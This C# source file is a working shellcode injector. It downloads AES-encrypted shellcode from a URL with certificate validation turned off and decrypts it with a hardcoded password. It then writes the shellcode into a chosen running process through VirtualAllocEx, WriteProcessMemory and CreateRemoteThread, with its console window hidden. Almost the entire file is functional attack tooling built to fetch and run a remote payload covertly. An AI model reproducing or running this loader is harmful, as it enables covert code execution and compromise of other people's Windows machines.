

using System;
using System.IO;
using System.Net;
using System.Text;
using System.Security.Cryptography.X509Certificates;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Collections.Generic;
using System.Diagnostics;


// this where All the API functions and variables needed to execute the shellcode is defined
public class Win32
{
	[DllImport("kernel32.dll")]
	public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

	[DllImport("kernel32.dll")]
	public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

	[DllImport("kernel32.dll")]
	public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);

	[DllImport("kernel32.dll")]
	public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

	[DllImport("kernel32.dll")]
	public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

	[DllImport("Kernel32")]
        public static extern IntPtr GetConsoleWindow();

        [DllImport("user32")]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	// Variables
        public static int PROCESS_CREATE_THREAD = 0x0002;
        public static int PROCESS_QUERY_INFORMATION = 0x0400;
        public static int PROCESS_VM_OPERATION = 0x0008;
        public static int PROCESS_VM_WRITE = 0x0020;
        public static int PROCESS_VM_READ = 0x0010;
        public static UInt32 MEM_COMMIT = 0x1000;
        public static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
        public static UInt32 PAGE_EXECUTE_READ = 0x20;
        public static UInt32 PAGE_READWRITE = 0x04;
        public static int SW_HIDE = 0;

}

// decrypt the shellcode
public class Decrypt
{
        public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
                byte[] decryptedBytes = null;
                byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

                using (MemoryStream ms = new MemoryStream())
                {
                        using (RijndaelManaged AES = new RijndaelManaged())
                        {
                                AES.KeySize = 256;
                                AES.BlockSize = 128;

                                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                                AES.Key = key.GetBytes(AES.KeySize / 8);
                                AES.IV = key.GetBytes(AES.BlockSize / 8);

                                AES.Mode = CipherMode.CBC;

                                using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                                {
                                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                                        cs.Close();
                                }
                                decryptedBytes = ms.ToArray();
                        }
                }

                return decryptedBytes;
        }
}


// downloading the encrypted shellcode and Execute it in memory
public class Program
{
	// This function will accept a process name as its first argument, get all running processes into a  
  	// Process array and iterate through them until the name of a process matches
	public static int GetPid(string procName)
        {
                int remoteProcId = 0;
                Process[] procs = Process.GetProcesses();
                foreach (Process proc in procs)
                {
                        if (proc.ProcessName == procName)
                        {
                                remoteProcId = proc.Id;
                                break;
                        }
                }

                return remoteProcId;
        }
	
	// accept a byte array containing the decrypted shellcode and an integer belonging to the remote process
	// where the shellcode will be injected
	public static void InjectShellcode(byte[] shellcode, int remoteProcId)
        {
                // Open the Remote Process
		IntPtr hProcess = Win32.OpenProcess(Win32.PROCESS_CREATE_THREAD | Win32.PROCESS_QUERY_INFORMATION | Win32.PROCESS_VM_OPERATION | Win32.PROCESS_VM_WRITE | Win32.PROCESS_VM_READ, false, remoteProcId);

		// Allocate memory with PAGE_READWRITE
		IntPtr spaceAddr = Win32.VirtualAllocEx(hProcess, IntPtr.Zero, shellcode.Length, Win32.MEM_COMMIT, Win32.PAGE_READWRITE);
		
		// Copy shellcode into allocated memory
		Win32.WriteProcessMemory(hProcess, spaceAddr, shellcode, new IntPtr(shellcode.Length), 0);

		// Change memory permission to PAGE_EXECUTE_READ
		uint oldProtect;
		Win32.VirtualProtectEx(hProcess, spaceAddr, (UIntPtr)shellcode.Length, Win32.PAGE_EXECUTE_READ, out oldProtect);
		
		// Create a remote thread to execute shellcode
		Win32.CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
        }

	// connect to the "shellcode_url", download its contents and return a byte array
        public static byte[] downloader(string shellcode_url)
        {
                WebClient wc = new WebClient();
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64 blalalala)");

                // selects the version of tls to use
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

                // Ignore Certificate Check, remove on production!
                // check stackovflow for "how to ignore the certificate check when ssl" question
                ServicePointManager.ServerCertificateValidationCallback = delegate {return true;};
                byte[] shellcode = wc.DownloadData(shellcode_url);
                return shellcode;


        }

	public static void Main(string[] args)
        {
		if (args.Length != 2)
		{
			Console.WriteLine("[!] Usage: ShellCode_Injection.exe <shellcode_url> <process_name>");
			return;
		}

                // Hide Process Window
                var handle = Win32.GetConsoleWindow();
                Win32.ShowWindow(handle, Win32.SW_HIDE);

                string url = args[0];
                byte[] shellcode = downloader(url);

                byte[] password = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes("DtGvFck#"));
                shellcode = Decrypt.AES_Decrypt(shellcode, password);

                string procName = args[1];
                int remoteProcId = GetPid(procName);

                InjectShellcode(shellcode, remoteProcId);
		
        }

}


